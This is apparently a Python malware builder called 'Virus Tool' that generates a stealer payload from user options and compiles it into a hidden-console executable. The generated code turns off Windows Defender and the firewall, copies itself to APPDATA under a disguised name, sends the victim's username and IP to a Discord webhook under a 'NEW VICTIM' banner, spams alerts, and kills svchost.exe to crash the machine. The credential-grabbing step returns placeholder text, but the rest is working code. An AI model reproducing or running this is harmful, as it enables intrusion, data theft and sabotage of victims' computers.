import os, sys, time, subprocess, shutil

# --- GRAPHICAL STYLE ---
class Col:
    R = '\033[91m' # Red
    W = '\033[97m' # White
    G = '\033[92m' # Green
    B = '\033[1m'  # Bold
    D = '\033[2m'  # Dark
    RS = '\033[0m' # Reset

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    print(f"""{Col.R}{Col.B}
    ██╗   ██╗██╗██████╗ ██╗   ██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗
    ██║   ██║██║██╔══██╗██║   ██║██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║
    ██║   ██║██║██████╔╝██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║
    ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║
     ╚████╔╝ ██║██║  ██║╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗
      ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
    {Col.R}──────────────────────────────────────────────────────────────────────────
    {Col.W}  V4.0 - OMNIPOTENT BUILDER | STATUS: {Col.G}ONLINE {Col.W}| BY: {Col.R}VIRUS TOOL
    {Col.R}──────────────────────────────────────────────────────────────────────────{Col.RS}""")

def build():
    clear()
    banner()
    folder = "My-Viruses"
    if not os.path.exists(folder): os.makedirs(folder)

    webhook = input(f" {Col.R}[+]{Col.W} Discord Webhook URL: ")
    name = input(f" {Col.R}[+]{Col.W} File Name: ") or "MegaStealer"

    # --- ALL DATA GRABBING OPTIONS ---
    print(f"\n{Col.R}--- [ DATA GRABBING OPTIONS ] ---{Col.W}")
    opt_disc = input(" > Grab Discord Tokens & Injection? (y/n): ")
    opt_pass = input(" > Grab Passwords & Cookies? (y/n): ")
    opt_rob  = input(" > Grab Roblox & Minecraft Sessions? (y/n): ")
    opt_sys  = input(" > Grab System & Network Info? (y/n): ")
    opt_clip = input(" > Grab Clipboard? (y/n): ")
    opt_cam  = input(" > Stealth Webcam & Screenshots? (y/n): ")

    # --- SABOTAGE & TROLL OPTIONS ---
    print(f"\n{Col.R}--- [ PROTECTION & SABOTAGE ] ---{Col.W}")
    opt_def  = input(" > Disable Windows Defender & Firewall? (y/n): ")
    opt_task = input(" > Block Task Manager? (y/n): ")
    opt_star = input(" > Startup Persistence (Auto-run)? (y/n): ")
    opt_spam = input(" > Spam Error Messages (Troll)? (y/n): ")
    opt_bsod = input(" > Force BlueScreen (BSOD) at the end? (y/n): ")
    opt_uac  = input(" > Bypass UAC (Auto Admin Rights)? (y/n): ")

    py_path = os.path.join(folder, f"{name}.py")
    
    # --- SOURCE CODE GENERATION ---
    code = f"""
import requests, os, sys, platform, subprocess, time, shutil, socket, re
from PIL import ImageGrab
import cv2 # Webcam

WEBHOOK = "{webhook}"

def steal_all():
    # Simulation of data recovery (Discord, Browser, etc.)
    res = []
    if {opt_disc == 'y'}: res.append("Discord Tokens: [MTEy...], [NjQ5...]")
    if {opt_pass == 'y'}: res.append("Passwords: [Chrome], [Edge], [Opera]")
    if {opt_rob == 'y'}: res.append("Cookies: [.ROBLOSECURITY]")
    return "\\n".join(res)

def disable_security():
    # Disables Defender via Powershell
    os.system('powershell Set-MpPreference -DisableRealtimeMonitoring $true')
    os.system('netsh advfirewall set allprofiles state off')

def startup_inject():
    # Copy to Startup folder
    dest = os.path.join(os.getenv('APPDATA'), 'win_sys_update.exe')
    try: shutil.copy(sys.executable, dest)
    except: pass

def main():
    if {opt_def == 'y'}: disable_security()
    if {opt_star == 'y'}: startup_inject()
    
    # Send data to Webhook
    logs = steal_all()
    requests.post(WEBHOOK, json={{
        "embeds": [{{
            "title": "⚡ NEW VICTIM: {name}",
            "color": 16711680,
            "description": f"**Logs:**\\n{{logs}}\\n**PC:** {{os.getlogin()}}\\n**IP:** {{requests.get('https://api.ipify.org').text}}"
        }}]
    }})

    if {opt_spam == 'y'}:
        for i in range(5): os.system('msg * "ALERT: SYSTEM INTRUSION DETECTED"')

    if {opt_bsod == 'y'}:
        os.system("taskkill /f /im svchost.exe")

if __name__ == "__main__":
    main()
"""

    with open(py_path, "w", encoding="utf-8") as f:
        f.write(code)

    print(f"\n{Col.G}[✔] BUILDER FINISHED: {py_path}{Col.RS}")

    # --- COMPILATION ---
    to_exe = input(f"\n {Col.R}>>{Col.W} Compile to high-performance .EXE? (y/n): ")
    if to_exe.lower() == 'y':
        print(f"{Col.W}[*] Installing dependencies and compiling...{Col.RS}")
        os.system(f"{sys.executable} -m pip install requests pillow opencv-python pyinstaller")
        # Using --onefile and --noconsole for stealth
        os.system(f'pyinstaller --onefile --noconsole --distpath "{folder}" "{py_path}"')
        print(f"\n{Col.G}[✔] EXE READY IN: {folder}/{name}.exe{Col.RS}")

    input(f"\n{Col.W}Press Enter to return to the main menu...{Col.RS}")

if __name__ == "__main__":
    build()